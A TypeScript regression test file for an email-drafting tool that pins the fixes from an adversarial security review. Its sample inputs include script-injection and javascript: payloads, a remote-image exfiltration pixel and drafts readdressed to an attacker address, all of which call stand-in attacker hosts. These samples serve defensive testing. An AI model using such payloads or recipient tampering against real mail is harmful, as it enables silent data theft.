/**
 * Regressions for the Node-side findings of the 2026-09-20 adversarial review
 * (a Codex pass plus a local pass), run before the OpenClaw deployment.
 *
 * The Apps Script findings are pinned in appsscript-endpoint.test.ts. These
 * cover the client, the drafting service and the MCP surface.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { AppsScriptProvider } from '../src/appsscript/client.js';
import { DraftingService } from '../src/drafting.js';
import { DraftMetaCache } from '../src/draft-meta.js';
import { sanitizeEmailHtml } from '../src/simulator/preview.js';
import type { Draft, Message } from '../src/core/types.js';

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'gmail-send-review-'));

const addr = (email: string, name?: string) => ({ email, ...(name ? { name } : {}) });

/**
 * A stand-in endpoint that, unlike the wire-protocol double, echoes parsed
 * headers back the way Gmail does. That is what makes divergence visible.
 */
function endpoint(state: { draft: Message }) {
  return async (_url: string, init: { body: string }) => {
    const req = JSON.parse(init.body) as { action: string; draftId?: string };
    const wire = (m: Message) => ({ ...m, date: m.date.toISOString() });
    const result =
      req.action === 'createDraft' || req.action === 'getDraft' || req.action === 'updateDraft'
        ? { id: 'r1', threadId: 't1', message: wire(state.draft), updatedAt: new Date().toISOString() }
        : {};
    return { status: 200, text: async () => JSON.stringify({ ok: true, result }) };
  };
}

const baseMessage = (over: Partial<Message> = {}): Message => ({
  id: 'm1',
  threadId: 't1',
  from: addr('owner@example.com', 'Owner'),
  to: [addr('intended@example.com')],
  cc: [],
  bcc: [],
  subject: 'Re: Numbers',
  date: new Date('2026-09-20T12:00:00Z'),
  text: 'approved text',
  html: '<div>approved text</div>',
  attachments: [],
  ...over,
});

const rendered = {
  mode: 'reply' as const,
  threadId: 't1',
  subject: 'Re: Numbers',
  from: addr('owner@example.com', 'Owner'),
  to: [addr('intended@example.com')],
  cc: [],
  bcc: [],
  text: 'approved text',
  html: '<div>approved text</div>',
  attachments: [],
};

describe('client rejects an endpoint URL that is not the real one', () => {
  it('refuses http, so the token is never posted in cleartext', () => {
    expect(() => new AppsScriptProvider({ url: 'http://script.google.com/macros/s/x/exec', token: 't' })).toThrow(/https/);
  });

  it('refuses a host that is not script.google.com', () => {
    expect(() => new AppsScriptProvider({ url: 'https://evil.example/exec', token: 't' })).toThrow(/script\.google\.com/);
  });

  it('accepts the real thing', () => {
    expect(() => new AppsScriptProvider({ url: 'https://script.google.com/macros/s/x/exec', token: 't' })).not.toThrow();
  });
});

describe('a draft changed outside gmail-send is reported honestly', () => {
  it('drops the cached render rather than reporting approved recipients', async () => {
    const state = { draft: baseMessage() };
    const provider = new AppsScriptProvider({
      url: 'https://script.google.com/macros/s/x/exec',
      token: 't',
      metaPath: path.join(tmp(), 'meta.json'),
      fetchImpl: endpoint(state) as never,
    });

    const created = await provider.createDraft({ rendered, raw: 'raw' } as never);
    expect(created.rendered?.to[0].email).toBe('intended@example.com');

    // Something readdresses the draft: a human fixing it, or a direct call to
    // the endpoint with the same token.
    state.draft = baseMessage({ to: [addr('exfil@attacker.example')], bcc: [addr('exfil@attacker.example')] });

    const refetched = await provider.getDraft('r1');
    expect(refetched.message.to[0].email).toBe('exfil@attacker.example');
    // The cache must not vouch for the old recipients.
    expect(refetched.rendered).toBeUndefined();
  });

  it('update_draft fails closed instead of reinstating the old recipient', async () => {
    const state = { draft: baseMessage() };
    const provider = new AppsScriptProvider({
      url: 'https://script.google.com/macros/s/x/exec',
      token: 't',
      metaPath: path.join(tmp(), 'meta.json'),
      fetchImpl: endpoint(state) as never,
    });
    const drafting = new DraftingService(provider, {});
    await provider.createDraft({ rendered, raw: 'raw' } as never);

    state.draft = baseMessage({ to: [addr('corrected@example.com')] });
    await expect(drafting.updateDraft('r1', { body: 'new body' })).rejects.toThrow(/changed outside gmail-send/);
  });
});

describe('the draft cache is written owner-only', () => {
  it('sets 0600 on the metadata file', () => {
    const file = path.join(tmp(), 'nested', 'meta.json');
    new DraftMetaCache(file).set('r1', rendered as never, 'raw');
    expect(fs.existsSync(file)).toBe(true);
    if (process.platform !== 'win32') {
      expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    }
  });
});

describe('preview sanitisation', () => {
  it('removes scripts, handlers and javascript: urls', () => {
    const hostile = `<div onclick="steal()"><script>fetch('https://attacker.example')</script><a href="javascript:steal()">x</a></div>`;
    const clean = sanitizeEmailHtml(hostile);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('javascript:');
  });

  it('blocks remote images, which are the exfiltration route that needs no send', () => {
    const pixel = `<img src="https://attacker.example/collect?q=secret">`;
    const clean = sanitizeEmailHtml(pixel);
    expect(clean).not.toContain('attacker.example');
    expect(clean).toContain('data-blocked-src');
  });

  it('leaves inline data images and ordinary formatting alone', () => {
    const fine = `<div dir="ltr"><b>bold</b> <img src="data:image/png;base64,AAA"></div>`;
    expect(sanitizeEmailHtml(fine)).toBe(fine);
  });
});

describe('the unfamiliar-recipient warning cannot vouch for itself', () => {
  const draft = {
    id: 'd1',
    threadId: 't1',
    message: baseMessage({ to: [addr('exfil@attacker.example')] }),
    rendered: { ...rendered, to: [addr('exfil@attacker.example')] },
    updatedAt: new Date(),
  } as unknown as Draft;

  const buildRuntime = (messages: Message[]) =>
    ({ provider: { getThread: async () => ({ id: 't1', messages }) } }) as never;

  it('still flags the address when the staged draft is in the thread', async () => {
    const { unfamiliarRecipients } = await import('../src/mcp/server.js');
    const inbound = baseMessage({ id: 'm1', from: addr('dana@partner.example'), to: [addr('owner@example.com')] });
    // The draft, filed into the same thread, carries the attacker address.
    // Gmail gives that message its own id, distinct from the draft id, so the
    // DRAFT label is what has to disqualify it rather than an id match.
    const draftInThread = baseMessage({ id: 'mDRAFT', to: [addr('exfil@attacker.example')], labelIds: ['DRAFT'] });

    const flagged = await unfamiliarRecipients(buildRuntime([inbound, draftInThread]), draft);
    expect(flagged).toEqual(['exfil@attacker.example']);
  });

  it('stays quiet for a domain the thread genuinely knows', async () => {
    const { unfamiliarRecipients } = await import('../src/mcp/server.js');
    const inbound = baseMessage({ id: 'm1', from: addr('dana@partner.example'), to: [addr('owner@example.com')] });
    const known = {
      ...draft,
      message: baseMessage({ to: [addr('someone@partner.example')] }),
      rendered: { ...rendered, to: [addr('someone@partner.example')] },
    } as unknown as Draft;
    expect(await unfamiliarRecipients(buildRuntime([inbound]), known)).toBeUndefined();
  });
});
